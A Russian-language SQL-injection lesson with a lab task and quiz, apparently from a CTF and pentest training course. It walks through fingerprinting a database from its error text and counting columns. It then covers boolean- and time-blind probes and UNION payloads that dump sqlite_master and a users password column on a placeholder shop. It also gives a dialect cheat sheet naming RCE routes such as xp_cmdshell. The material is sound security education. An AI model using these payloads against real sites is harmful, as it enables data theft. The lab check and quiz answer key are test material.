---
id: web-sqli-dbms
title: "Атака на СУБД: карта диалектов и переход к разбору каждой базы"
category: web
parent: web-sqli
difficulty: easy
order: 2
tags: [sqli, database, dbms, mysql, postgresql, mssql, oracle, sqlite, dialect, fingerprint]
prerequisites: [web-sqli]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 30
summary: "Как определить СУБД по отклику и выбрать правильный диалект атаки: сводная карта синтаксиса и навигация к детальному разбору MySQL, PostgreSQL, MSSQL, Oracle и SQLite."
lab:
  kind: shell
  title: "Практика: фингерпринт СУБД и UNION-дамп (SQLite)"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Добавь кавычку: curl -s 'https://shop.example/product?id=1%27' — текст ошибки называет СУБД."
    - "Считай колонки: ORDER BY 3 работает, ORDER BY 4 падает — значит их три."
    - "Список таблиц в SQLite лежит в sqlite_master: UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'."
    - "Дампни пароль: curl -s 'https://shop.example/product?id=-1 UNION SELECT 1,password,3 FROM users' > found.txt — затем check."
---

## Вопрос, с которого всё начинается

Ты нашёл SQL-инъекцию в параметре `id`. Ты вставляешь привычный `' OR 1=1-- -` — и ничего. Меняешь кавычку, пробуешь `SLEEP(5)` — ответ мгновенный. Что не так?

Проблема в том, что «SQL» — это не один язык. MySQL, PostgreSQL, MSSQL, Oracle и SQLite — пять **разных диалектов**. `SLEEP(5)` существует только в MySQL; в PostgreSQL это `pg_sleep(5)`, в MSSQL — `WAITFOR DELAY`, в Oracle — `dbms_pipe.receive_message`, а в SQLite задержек нет вообще. Payload под MySQL на другой базе просто выдаст ошибку.

Значит, прежде чем атаковать, надо понять: **с какой базой мы говорим**. Этим и займёмся на одном живом параметре.

## Наш пример

Есть магазин `shop.example`. Каталог товаров отдаётся по `GET /product?id=1`:

```bash
$ curl -s 'https://shop.example/product?id=1'
[[1,"Laptop",999.0]]
```

Сервер вернул JSON-массив с товаром. Параметр `id` явно уходит в запрос к базе. Проверим, склеен ли он со строкой запроса — добавим одну кавычку:

```bash
$ curl -s 'https://shop.example/product?id=1%27'
SQL error: unrecognized token: "'"
```

Ошибка. Это первая улика: запрос сломан, значит, инъекция есть. Но текст ошибки — это ещё и **отпечаток** базы. `unrecognized token` — характерная формулировка SQLite.

## Шаг 1: фингерпринт по тексту ошибки

Каждая СУБД ругается по-своему. Сверим наш ответ с картой:

| Признак в ответе | Вероятная СУБД |
|------------------|----------------|
| `You have an error in your SQL syntax` | MySQL / MariaDB |
| `syntax error at or near "..."` | PostgreSQL |
| `Unclosed quotation mark after the character string` / `Incorrect syntax near` | MSSQL |
| `ORA-00933: SQL command not properly ended` | Oracle |
| `unrecognized token` / `near "...": syntax error` / `no such table` | SQLite |

Наш `unrecognized token` — SQLite. Один запрос дал нам диалект. Теперь можно уточнить версию — но и функция версии у каждой базы своя:

| СУБД | Запрос версии |
|------|---------------|
| MySQL | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MSSQL | `SELECT @@version` |
| Oracle | `SELECT banner FROM v$version` |
| SQLite | `SELECT sqlite_version()` |

## Шаг 2: считаем колонки через ORDER BY

Почти в любой базе работает `ORDER BY N`: если колонки с номером `N` нет, запрос падает. Перебираем `N` и смотрим, на каком значении ответ сломается:

```bash
$ for n in 1 2 3 4; do
>   printf '%s -> ' "$n"
>   curl -s "https://shop.example/product?id=1 ORDER BY $n" | head -c 30; echo
> done
1 -> [[1,"Laptop",999.0]]
2 -> [[1,"Laptop",999.0]]
3 -> [[1,"Laptop",999.0]]
4 -> SQL error: 1st ORDER BY term out of range
```

На `4` запрос упал — значит, в запросе **три колонки**. Это критично для UNION-инъекции: количество колонок в `UNION SELECT` должно совпадать.

## Шаг 3: проверяем boolean-различие

Прежде чем строить UNION, убедимся, что можем влиять на логику. Сравним два запроса — «истина» и «ложь»:

```bash
$ curl -s 'https://shop.example/product?id=1 AND 1=1'
[[1,"Laptop",999.0]]
$ curl -s 'https://shop.example/product?id=1 AND 1=2'
[]
```

`AND 1=1` вернул товар, `AND 1=2` — пустоту. Это **boolean-blind**: приложение честно отражает, истинно ли наше условие. Дальше можно задавать любые вопросы к базе.

## Шаг 4: time-blind — и как понять, что его нет

Если ответы выглядят одинаково, инъекцию находят по **времени**. Но функция задержки у каждой базы своя, и в SQLite её нет. Проверим MySQL-вариант:

```bash
$ time curl -s -o /dev/null 'https://shop.example/product?id=1; SELECT SLEEP(5)'
real    0m0.084s
```

Мгновенно. Либо `SLEEP` не сработал, либо это не MySQL. Наша ошибка уже сказала «SQLite» — а там задержек нет, поэтому time-blind отпадает, и мы работаем через UNION/boolean. Так фингерпринт экономит целый класс попыток.

## Шаг 5: UNION и вывод данных

Раз колонок три, соберём UNION-запрос и посмотрим, какие колонки отражаются в ответе:

```bash
$ curl -s "https://shop.example/product?id=-1 UNION SELECT 1,'X',3"
[[1,"X",3]]
```

Вторая колонка печатается. Теперь в неё можно положить данные из системного каталога. У каждой базы каталог называется по-разному: в MySQL/PostgreSQL это `information_schema.tables`, в Oracle — `all_tables`, в MSSQL — `sys.objects`, а в SQLite — `sqlite_master`.

```bash
$ curl -s "https://shop.example/product?id=-1 UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'"
[[1,"products",3]]
[[1,"users",3]]
```

Таблица `users` — наша следующая цель. С этого места начинается уже детальный разбор SQLite (урок `db-sqlite`).

## Сводная карта диалектов

Держи перед глазами при ручной инъекции:

| Возможность | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
|-------------|-------|------------|-------|--------|--------|
| Комментарий | `-- `, `#`, `/* */` | `-- `, `/* */` | `-- `, `/* */` | `-- `, `/* */` | `-- `, `/* */` |
| Конкатенация | `CONCAT(a,b)` | `a || b` | `a + b` | `a || b` | `a || b` |
| Агрегация строк | `GROUP_CONCAT` | `string_agg` | `STRING_AGG` | `LISTAGG` | `GROUP_CONCAT` |
| Пауза | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `dbms_pipe.receive_message` | нет |
| Каталог | `information_schema` | `information_schema` | `sys.objects` | `all_tables` | `sqlite_master` |
| RCE | UDF `lib_mysqludf_sys` | `COPY ... FROM PROGRAM` | `xp_cmdshell` | Java stored procs | `load_extension` |

Каналы утечки: **UNION** и **boolean-blind** есть везде; **error-based** — у всех, кроме SQLite; **time-blind** — у четырёх из пяти; **OOB** (внешние DNS/HTTP-запросы) — у MySQL/PostgreSQL/MSSQL/Oracle, но не у SQLite.

## Что мы теперь знаем

- **Сначала фингерпринт, потом payload.** Одна кавычка → текст ошибки → диалект.
- **`ORDER BY N`** находит число колонок почти в любой базе.
- **`AND 1=1` vs `AND 1=2`** даёт boolean-сигнал даже без вывода.
- **Функция задержки зависит от базы**, а в SQLite её нет — не трать время.
- **Каталог метаданных называется по-разному:** `information_schema`, `all_tables`, `sys.objects`, `sqlite_master`.
- **RCE есть не везде:** проще всего в MSSQL и PostgreSQL, почти невозможно в SQLite.

## На что смотреть дальше

- **Не смешивай диалекты.** `SLEEP` в PostgreSQL — ошибка функции; `#`-комментарий не работает вне MySQL.
- **`--` требует пробела в MySQL** (`-- `, а не `--`), иначе запрос не закомментируется.
- **Oracle регистрозависим:** неквотированные идентификаторы — в верхнем регистре (`ALL_TABLES`).
- **Stacked-запросы (`;`) есть не везде:** в Oracle и часто в SQLite их нет — планируй UNION/blind.
- **MySQL может блокировать файлы** настройкой `--secure-file-priv` — проверяй, прежде чем рассчитывать на `INTO OUTFILE`.
- **Определил базу — иди в её урок.** Детали MySQL, PostgreSQL, MSSQL, Oracle и SQLite разобраны отдельно.

## Слепая инъекция: когда данных не видно

Если ошибки скрыты, а `UNION` не проходит, инъекция остаётся **слепой**. Вся
информация добывается через один бит: «истина/ложь». Ты задаёшь базе вопрос с
ответом да/нет и смотришь на реакцию страницы:

```sql
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
```

Страница отрисовалась нормально — буква угадана; изменилась — нет. Перебором по
одному символу собирается вся строка. Медленно, но надёжно, и работает даже на
самых «закрытых» приложениях.

Для boolean-blind полезно представить символ числом и бинарным поиском сузить
диапазон: `ASCII(SUBSTRING(...)) > 96` отсекает половину алфавита за один запрос.
Так строка из 20 символов перебирается не за сотни, а за десятки запросов.

## Извлечение данных по шагам

Практический алгоритм для любой слепой задачи:

1. **Подтверди инъекцию.** `' AND 1=1--` и `' AND 1=2--` должны давать разный
   ответ. Нет разницы — вектора здесь нет.
2. **Определи диалект.** Разные СУБД по-разному отвечают на `SELECT @@version`
   против `SELECT version()`; ошибки и задержки подскажут, кто это.
3. **Вытащи метаданные.** Имена таблиц и колонок из системных схем
   (`information_schema`, `sqlite_master`, `pg_catalog`).
4. **Читай строку по битам.** `SUBSTRING` + `ASCII` + сравнение.
5. **Автоматизируй.** `sqlmap --technique=B` делает шаги 2–4 за тебя.

И главное: слепая инъекция — это не «инъекция похуже». Это тот же класс уязвимости,
и данные из неё утекают полностью, просто медленнее.

## UNION требует совпадения типов

Даже при верном числе колонок `UNION` не сработает, если типы не совпадают. Если
первая колонка — число, подставляй `NULL`, а не строку: `UNION SELECT
NULL,version(),NULL`. `NULL` совместим с любым типом, поэтому это универсальный
заполнитель для «пустых» позиций.

## Квиз

Проверь себя.

```quiz
- question: 'Ответ `SQL error: unrecognized token` указывает на какую СУБД?'
  options:
    - "PostgreSQL"
    - "MySQL"
    - "MSSQL"
    - "SQLite"
  answer: 3
  explanation: "Формулировка «unrecognized token» — характерный отпечаток SQLite."
- question: "Зачем перебирать `ORDER BY N`?"
  options:
    - "Чтобы ускорить запрос"
    - "Чтобы узнать число колонок в запросе — нужно для UNION"
    - "Чтобы включить отладку"
    - "Чтобы обойти WAF"
  answer: 1
  explanation: "Когда N превышает число колонок, запрос падает — так находится их количество."
- question: "Какая функция агрегирует строки в PostgreSQL?"
  options:
    - "GROUP_CONCAT"
    - "string_agg"
    - "LISTAGG"
    - "STRING_JOIN"
  answer: 1
  explanation: "В PostgreSQL это string_agg; GROUP_CONCAT — MySQL, LISTAGG — Oracle."
- question: "Как организовать time-blind в MSSQL?"
  options:
    - "SLEEP(5)"
    - "pg_sleep(5)"
    - "WAITFOR DELAY '0:0:5'"
    - "dbms_pipe.receive_message"
  answer: 2
  explanation: "В MSSQL пауза делается через WAITFOR DELAY."
- question: "Где в SQLite лежит список таблиц?"
  options:
    - "information_schema.tables"
    - "all_tables"
    - "sys.objects"
    - "sqlite_master"
  answer: 3
  explanation: "Метаданные SQLite хранятся в sqlite_master (он же sqlite_schema)."
```

## Куда дальше

Определив базу, ты переходишь в урок по конкретной СУБД — начинай с той, что показал фингерпринт (`db-sqlite`, `db-mysql`, `db-postgresql`, `db-mssql`, `db-oracle`). А если хочешь автоматизировать весь этот путь, следующий урок (`web-tool-sqlmap`) показывает, как `sqlmap` делает фингерпринт, находит колонки и дампит таблицу одной командой. А пока главное запомни: **диалект определяет payload** — сначала узнай базу, потом атакуй.

## Где пригодится

- **CTF (Web):** разные СУБД — частая тема; быстрый фингерпринт экономит десятки минут.
- **Bug bounty:** реальные приложения используют MySQL, PostgreSQL, MSSQL, Oracle; payload под правильную базу = подтверждённый high/critical.
- **Пентест:** отчёт требует точной идентификации СУБД и рабочего PoC под неё.
- **Работа (AppSec):** ревью кода и конфигураций под конкретный движок; понимание, где возможен RCE через базу.
